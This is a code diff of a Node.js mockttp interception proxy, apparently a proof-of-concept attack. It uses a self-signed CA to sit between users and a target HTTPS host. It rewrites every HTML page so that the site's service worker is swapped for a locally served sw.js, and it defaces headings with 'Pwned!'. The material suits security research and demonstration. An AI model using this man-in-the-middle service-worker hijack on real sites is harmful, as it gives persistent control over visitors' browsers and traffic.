@@ -1,6 +1,7 @@
 (async () => {
     const mockttp = require('mockttp');
     const path = require('path');
+    var globToRegExp = require('glob-to-regexp');
 
     // Create a proxy server with a self-signed HTTPS CA certificate:
     const https = await mockttp.generateCACertificate();
@@ -22,33 +23,40 @@
         </script>
     `;
 
+
+    const beforeResponse = {
+
+        beforeResponse: (response) => {
+
+            // Here you can access the real response:
+            // console.log(`Got ${response.statusCode} response with body: ${response.body.text}`);
+
+            // Values returned here replace parts of the response:
+            if (response.headers['content-type']?.startsWith('text/html')) {
+                // E.g. append to all HTML response bodies:
+                return {
+                    headers: { 'content-type': 'text/html' },
+                    body: response.body.text
+                    .replace('service-worker.js', 'sw.js')
+                    // .replace('</head>', serviceWorkerInclude + '</head>')
+                    .replace(/<h1.*?<\/h1>/g, '<h1>Pwned!</h1>')
+                };
+            } else {
+                return response;
+            }
+        }
+    }
+
+
     await server.anyRequest().thenPassThrough()
+    
+
+    
+    await server.get('https://' + HOST).thenPassThrough(beforeResponse); 
+    await server.get(globToRegExp(`https://${HOST}/*`)).thenPassThrough(beforeResponse); 
     await server.get('https://' + HOST + "/sw.js").thenFromFile(200, "./sw.js", {
         'Content-Type': 'application/javascript'
     });
-    await server.get('https://' + HOST).thenPassThrough({
-
-                beforeResponse: (response) => {
-    
-                    // Here you can access the real response:
-                    // console.log(`Got ${response.statusCode} response with body: ${response.body.text}`);
-        
-                    // Values returned here replace parts of the response:
-                    if (response.headers['content-type']?.startsWith('text/html')) {
-                        // E.g. append to all HTML response bodies:
-                        return {
-                            headers: { 'content-type': 'text/html' },
-                            body: response.body.text
-                            .replace('service-worker.js', 'sw.js')
-                            // .replace('</head>', serviceWorkerInclude + '</head>')
-                            .replace(/<h1.*?<\/h1>/g, '<h1>Pwned!</h1>')
-                        };
-                    } else {
-                        return response;
-                    }
-                }
-            }); 
-    
     await server.start();
 
     const caFingerprint = mockttp.generateSPKIFingerprint(https.cert);
